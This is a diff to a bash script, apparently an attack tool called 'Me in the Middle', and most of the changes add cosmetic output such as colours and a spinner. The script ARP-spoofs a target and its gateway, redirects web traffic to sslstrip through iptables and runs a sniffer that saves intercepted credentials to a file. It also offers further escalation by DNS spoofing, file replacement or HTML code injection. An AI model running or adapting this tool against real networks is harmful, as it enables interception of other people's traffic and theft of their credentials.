@@ -2,15 +2,51 @@
 
 trap "trap - SIGTERM && kill -- -$$" SIGINT SIGTERM EXIT
 
-echo -e "\n███╗   ███╗███████╗    ██╗███╗   ██╗    ████████╗██╗  ██╗███████╗    ███╗   ███╗██╗██████╗ ██████╗ ██╗     ███████"
+GREEN='\033[1;32m'
+CYAN='\033[0;36m'
+NOCOLOR='\033[0m'
+
+
+echo -e "${CYAN}\n███╗   ███╗███████╗    ██╗███╗   ██╗    ████████╗██╗  ██╗███████╗    ███╗   ███╗██╗██████╗ ██████╗ ██╗     ███████"
 echo -e "████╗ ████║██╔════╝    ██║████╗  ██║    ╚══██╔══╝██║  ██║██╔════╝    ████╗ ████║██║██╔══██╗██╔══██╗██║     ██╔════╝"
 echo -e "██╔████╔██║█████╗      ██║██╔██╗ ██║       ██║   ███████║█████╗      ██╔████╔██║██║██║  ██║██║  ██║██║     █████╗  "
 echo -e "██║╚██╔╝██║██╔══╝      ██║██║╚██╗██║       ██║   ██╔══██║██╔══╝      ██║╚██╔╝██║██║██║  ██║██║  ██║██║     ██╔══╝  "
 echo -e "██║ ╚═╝ ██║███████╗    ██║██║ ╚████║       ██║   ██║  ██║███████╗    ██║ ╚═╝ ██║██║██████╔╝██████╔╝███████╗███████╗"
-echo -e "╚═╝     ╚═╝╚══════╝    ╚═╝╚═╝  ╚═══╝       ╚═╝   ╚═╝  ╚═╝╚══════╝    ╚═╝     ╚═╝╚═╝╚═════╝ ╚═════╝ ╚══════╝╚══════╝\n"
+echo -e "╚═╝     ╚═╝╚══════╝    ╚═╝╚═╝  ╚═══╝       ╚═╝   ╚═╝  ╚═╝╚══════╝    ╚═╝     ╚═╝╚═╝╚═════╝ ╚═════╝ ╚══════╝╚══════╝${NOCOLOR}\n"
+
+echo "Copyright 2020 - Gavin Edgerton and Luke Williams"
+
+#define functions and variables for some ASCII art
+
+spinner=( '|' '/' '-' '\')
+
+copy(){
+    spin &
+    pid=$!
+
+#    for i in `seq 1 10`
+#    do
+        sleep 1.8
+#    done
+
+    kill $pid
+    echo -ne "\u001b[{1}F\u001b[2K"
+    echo ""
+}
+
+spin(){
+    while [ 1 ]
+    do
+        for i in "${spinner[@]}"
+        do
+             echo -ne "\r$i$i$i"
+             sleep 0.2
+        done
+     done
+}
 
 
-
+#
 MYIP=$(ip route | grep src | cut -d ' ' -f 9)
 
 echo "1" > /proc/sys/net/ipv4/ip_forward
@@ -27,6 +63,7 @@ read -p "Enter a subnet to scan: " TARGET_SUBNET
 elif [[ -n $1 ]] && [[ -z $2 ]]
 then
 ./ARP_netscan.py $1 && TARGET_IP=$(cat /tmp/mitm.txt | cut -d' ' -f 1) && GATEWAY_IP=$(cat /tmp/mitm.txt | cut -d' ' -f 2)
+copy
 
 elif [[ -n $1 ]] && [[ -n $2 ]]
 then
@@ -34,30 +71,33 @@ TARGET_IP=$1
 GATEWAY_IP=$2
 fi
 
+echo "Spoofing target ${TARGET_IP} and gateway router ${GATEWAY_IP}"
+copy
 #run the ARP spoofing script
 ./arp_spoof.py $TARGET_IP $GATEWAY_IP >> /tmp/arp_log.txt &
 
+echo -e "${GREEN}\nSuccess. You are now the any-gendered person in the middle.${NOCOLOR}"
+copy
+
+echo -e "Updating firewall rules to forward intercepted webrequests to sslstrip"
+
 sleep 1
-
-echo -e "\nSuccess. You are now the any-gendered person in the middle.\n"
-
-sleep 1
-
-echo "Updating firewall rules to forward intercepted webrequests to sslstrip"
 
 iptables -F
 
-sleep 1
+copy
 
 iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
 
-sslstrip 2>/dev/null &
+echo -e "Starting sslstrip 0.9 by Moxie Marlinspike"
+copy
 
-sleep 1
+sslstrip > /dev/null 2> /dev/null &
 
 INTERFACE=$(ip route | grep default | cut -d ' ' -f 5)
 
-echo -e "\nStarting packet sniffer on interface ${INTERFACE}\n"
+echo -e "Starting packet sniffer on interface ${INTERFACE}"
+copy
 
 #DATE=$(date | tr ' ' '-')
 
@@ -69,9 +109,9 @@ echo -e "\nStarting packet sniffer on interface ${INTERFACE}\n"
 
 ./packet_sniffer.py $INTERFACE &
 
-echo -e "Packet sniffing in progress. Any credentials detected over the wire will be saved in ./output.txt\n\n---------------------------------------------------\n"
+echo -e "${GREEN}Packet sniffing in progress. Any credentials detected over the wire will be saved in ./output.txt\n\n${NOCOLOR}---------------------------------------------------\n"
 echo -e "Would you like to escalate the attack?"
-#echo "Note: Selecting one of these attacks will end the sslstrip currently in progress, potentially limiting the credentials found by the packet sniffer."
+#selecting DNS Spoofing ends the sslstrip currently in progress
 echo -e "1. DNS Spoofing"
 echo "2. File Replacement"
 echo -e "3. Code Injection\n"
@@ -113,6 +153,8 @@ elif [[ $USERNUMBER == '3' ]]
 then
 
 iptables -F && iptables -I INPUT -j NFQUEUE --queue-num 0 && iptables -I OUTPUT -j NFQUEUE --queue-num 0
+
+echo "Waiting for target to open HTML files..."
 
 ./code_injector.py
 
